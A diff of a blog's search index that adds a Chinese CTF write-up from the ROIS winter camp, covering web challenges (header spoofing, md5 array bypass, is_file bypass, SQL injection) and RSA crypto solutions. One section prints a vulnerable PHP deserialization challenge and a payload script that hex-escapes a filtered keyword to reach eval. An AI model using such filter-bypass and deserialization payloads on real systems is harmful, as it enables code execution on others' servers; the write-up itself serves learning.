@@ -4916,9 +4916,105 @@ public function __toString()&#123;
 <p>php小trick、</p>
 <p>文件上传</p>
 <p>认为，sql和反序列化较难，注入有多种形式，而反序列化有unserialize()和phar</p>
+<h2 id="phptrick"><a href="#phptrick" class="headerlink" title="phptrick"></a>phptrick</h2><p>1.extract()、parse_str() 等变量覆盖</p>
+<p>2.弱类型比较</p>
+<ul>
+<li>is_numeric 前后有空格时，不会判断为true</li>
+<li>松散（弱）比较时，两个0e开头的不同哈希会判断为相等</li>
+<li>松散（弱）比较时，非数字的字符串序列和数字比较会自动转换</li>
+<li>strcmp/ereg 等函数在传入参数类型为数组时会有非预期行为</li>
+</ul>
+<p><img src="/2022/01/20/2022/1/notes/image-20220123200022722.png" alt="image-20220123200022722"></p>
 ]]></content>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>rois-冬令营</title>
+    <url>/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/</url>
+    <content><![CDATA[<p> 偶然得知了rois举办了这个冬令营</p>
+<p>web题目大部分自己做，有几道是在别人帮助下的</p>
+<p>很高兴这次密码学做出了两道简单题</p>
+<p>今天写下writeup总结一下</p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214412266.png" alt="image-20220205214412266"></p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214430069.png" alt="image-20220205214430069"></p>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214507437.png" alt="image-20220205214507437"></p>
+<p>这题确实是签到题，不过刚开始没有想到</p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214617858.png" alt="image-20220205214617858"></p>
+<p>打开后是这样的</p>
+<p>按照提示输入flag参数</p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214651070.png" alt="image-20220205214651070"></p>
+<p>很明显这个javascript弹窗验证了输入flag与校验flag是否一致</p>
+<p>所以不知道flag的前提下无法输入正确</p>
+<p>放弃一段时间后我想起来可以抓包看看，因为这只是一道签到题不会太难考点</p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215003047.png" alt="image-20220205215003047"></p>
+<p>这是直接送上源码了</p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215104974.png" alt="image-20220205215104974"></p>
+<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215145268.png" alt="image-20220205215145268"></p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215246704.png" alt="image-20220205215246704"></p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215308960.png" alt="image-20220205215308960"></p>
+<p>通过回显猜测到考点</p>
+<p>xff头的使用</p>
+<p>后面我在同学提醒下才知道可以bp爆破，之前一直手动换ip。。</p>
+<h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215904689.png" alt="image-20220205215904689"></p>
+<p>这题是靠搜索出来的</p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220015271.png" alt="image-20220205220015271"></p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215948168.png" alt="image-20220205215948168"></p>
+<h4 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220225482.png" alt="image-20220205220225482"></p>
+<p>抓包修改即可</p>
+<h4 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220249818.png" alt="image-20220205220249818"></p>
+<p>这题稍微麻烦点</p>
+<p>我吸取的教训是bp要用专业版，这样线程才能高，别用什么社区版爆破半天出不来</p>
+<p>然后这题后面无非是post传参、md5绕过、robots协议、dirsearch扫描之类的小知识点</p>
+<h4 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220453175.png" alt="image-20220205220453175"></p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220509263.png" alt="image-20220205220509263"></p>
+<p>这题属实是有点小坑</p>
+<p>这个$_SERVER[‘QUERY_STRING’]，经过查询是截取get传参？背后的字符串</p>
+<p>下面的if判断是否传进is_admin这个参数，如果没有就完成变量覆盖</p>
+<p>最后变量为真就输出flag</p>
+<p>难点就在前面不能有那个参数，本来按照以前解法就urlencode就可以了</p>
+<p>但是这边已经好心地先帮你decode了</p>
+<p>后面才知道有php有一个特性，就是会将空格解析为_</p>
+<p><a href="https://blog.csdn.net/qq_45521281/article/details/105871192">利用PHP的字符串解析特性绕过Waf_WHOAMIAnony的博客-CSDN博客_php的字符串解析特性</a></p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221201519.png" alt="image-20220205221201519"></p>
+<h4 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221233952.png" alt="image-20220205221233952"></p>
+<p>md5数组绕过</p>
+<h4 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221310685.png" alt="image-20220205221310685"></p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221332540.png" alt="image-20220205221332540"></p>
+<p>这题就是明确目标：绕过is_file函数</p>
+<p>查询到文章</p>
+<p><a href="https://www.freebuf.com/articles/web/261379.html">和开发斗智斗勇的日常：PHP is_file()函数绕过 - FreeBuf网络安全行业门户</a></p>
+<p>创造一个不存在路径就可以绕过</p>
+<p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221557365.png" alt="image-20220205221557365"></p>
+<h4 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221640928.png" alt="image-20220205221640928"></p>
+<p>万能密码</p>
+<h4 id="10"><a href="#10" class="headerlink" title="10."></a>10.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221707108.png" alt="image-20220205221707108"></p>
+<p>简单的报错查询注入即可</p>
+<h4 id="11"><a href="#11" class="headerlink" title="11."></a>11.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221735035.png" alt="image-20220205221735035"></p>
+<p>题目</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kitten</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $friend;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$word</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$name = $word;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">meow</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Meow~ My name is &quot;</span> . <span class="keyword">$this</span>-&gt;$name . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">findFriend</span>(<span class="params">$sleepingKitten</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;friend = unserialize($sleepingKitten);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Witch</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $incantation;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;incantation);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Witch&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$sleepingKitten</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/incantation/i&quot;</span>, $sleepingKitten)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;h3&gt;Witchcraft is NOT ALLOWED!&lt;h3&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pusheen = <span class="keyword">new</span> Kitten(<span class="string">&quot;pusheen&quot;</span>);</span><br><span class="line">$pusheen-&gt;meow();</span><br><span class="line">$sleepingKitten = base64_decode($_POST[<span class="string">&quot;friend&quot;</span>]);</span><br><span class="line">check($sleepingKitten);</span><br><span class="line">$pusheen-&gt;findFriend($sleepingKitten);</span><br><span class="line">$pusheen-&gt;friend-&gt;meow();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>分析一下代码</p>
+<p>最后要成功触发tostring方法执行eval函数才会输出flag</p>
+<p>贴上payload脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Witch</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $incantation = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kitten</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $friend;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$name = <span class="keyword">new</span> Witch();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;friend = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b = serialize(<span class="keyword">new</span> Kitten());</span><br><span class="line">$b = str_replace(<span class="string">&quot;s:18&quot;</span>, <span class="string">&quot;S:18&quot;</span>, $b);</span><br><span class="line">$b = str_replace(<span class="string">&quot;incantation&quot;</span>, <span class="string">&quot;\\69ncantat\\69on&quot;</span>, $b);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($b);</span><br></pre></td></tr></table></figure>
+
+<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205222140518.png" alt="image-20220205222140518"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p &#x3D; 98076983780120527792770458890688780277555823887994682214163454666075869521826187406254142075354923691219183496475686028848162360931603330874280505123843552372958293491848353122538774273040195483023876976399815394023691848915634977595301613954470455946398168537308640467440726111280710149870545973093090456889</span><br><span class="line">q &#x3D; 109128821261524367993374364036752312900012076309330756131518403621847420955028710012028358702633852630087399851151754849147220171122637334312693362040478478695565880745177002757742893966644802468111652889172842876540303217969414827643680547263729238638892692735875504393903671278190481143453326533644387573461</span><br><span class="line">c &#x3D; 8696776091045108490706741201669649821552098817481485617853249715695452117022972197749187352644944365460751251101372390508596189150805218655222108412326856187627845335538773557544760562801719469076203277592589287193986370203119805644848355844583928832131820820974656892977022368839425335996903938252794569016614874508025078423755886667955587053802224154129110315695574349620275748114001260456693435229465252466658050265611351185710207338488975143389774529701841231400140833998139253918045998745339223155390778692014423596594980230369885048851010327175679107067569282667999861554443225979013382555032561744321517672718</span><br></pre></td></tr></table></figure>
+
+<p>py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">c,e,p,q</span>):</span></span><br><span class="line">	L=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">	d=gmpy2.invert(e,L)</span><br><span class="line">	n=p*q</span><br><span class="line">	m=gmpy2.powmod(c,d,n)</span><br><span class="line">	flag=str(m)</span><br><span class="line">	print(<span class="string">&quot;flag&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">	print(long_to_bytes(m))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	p = <span class="number">98076983780120527792770458890688780277555823887994682214163454666075869521826187406254142075354923691219183496475686028848162360931603330874280505123843552372958293491848353122538774273040195483023876976399815394023691848915634977595301613954470455946398168537308640467440726111280710149870545973093090456889</span></span><br><span class="line">	q = <span class="number">109128821261524367993374364036752312900012076309330756131518403621847420955028710012028358702633852630087399851151754849147220171122637334312693362040478478695565880745177002757742893966644802468111652889172842876540303217969414827643680547263729238638892692735875504393903671278190481143453326533644387573461</span></span><br><span class="line">	e = <span class="number">0x10001</span></span><br><span class="line">	c = <span class="number">8696776091045108490706741201669649821552098817481485617853249715695452117022972197749187352644944365460751251101372390508596189150805218655222108412326856187627845335538773557544760562801719469076203277592589287193986370203119805644848355844583928832131820820974656892977022368839425335996903938252794569016614874508025078423755886667955587053802224154129110315695574349620275748114001260456693435229465252466658050265611351185710207338488975143389774529701841231400140833998139253918045998745339223155390778692014423596594980230369885048851010327175679107067569282667999861554443225979013382555032561744321517672718</span></span><br><span class="line">	Decrypt(c,e,p,q)</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205222341034.png" alt="image-20220205222341034"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n &#x3D; 83283614719107534991800643035912480346726823839289209334614767173634111928391</span><br><span class="line">c &#x3D; 70586109384880981913502819444082705449386947354232744667244143211827298034941</span><br></pre></td></tr></table></figure>
+
+<p>py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding= utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">83283614719107534991800643035912480346726823839289209334614767173634111928391</span></span><br><span class="line">c = <span class="number">70586109384880981913502819444082705449386947354232744667244143211827298034941</span></span><br><span class="line"><span class="comment">#1.将n分解为p和q</span></span><br><span class="line">p = <span class="number">284434381548437927107267673531343782677</span></span><br><span class="line">q = <span class="number">292804316643150613089811685591944680683</span></span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"><span class="comment">#2.求d</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="comment">#3.m=pow(c,d,n)</span></span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line">flag=str(m)</span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line">print(binascii.unhexlify(hex(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#binascii.unhexlify(hexstr):从十六进制字符串hexstr返回二进制数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>ctf</tag>
       </tags>
   </entry>
 </search>
